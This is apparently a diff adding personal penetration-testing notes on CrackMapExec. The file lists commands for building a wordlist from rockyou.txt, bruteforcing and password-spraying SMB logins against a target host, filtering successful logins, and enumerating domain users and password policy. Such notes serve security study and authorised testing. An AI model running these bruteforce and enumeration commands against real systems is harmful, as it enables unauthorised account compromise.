@@ -1,0 +1,11 @@
+# check CME wiki
+head -n 1000 /path/to/rockyou.txt > top1000.txt
+crackmapexec smb $h						# some info
+crackmapexec smb $h -u john -p password				# try to log with creds
+crackmapexec smb $h -u users.txt -p top1000.txt			# bruteforce
+crackmapexec smb $h -u users.txt -p top1000.txt --continue-on-success
+crackmapexec smb $h -u users.txt -p top1000.txt --continue-on-success | grep '[+]'
+crackmapexec smb $h -u user -p pass --pass-pol			# get password policy of the domain
+crackmapexec smb $h -u user -p pass --users			# enum users
+
+# could try with SMB, SSH, LDAP, WINRM, MSSQL
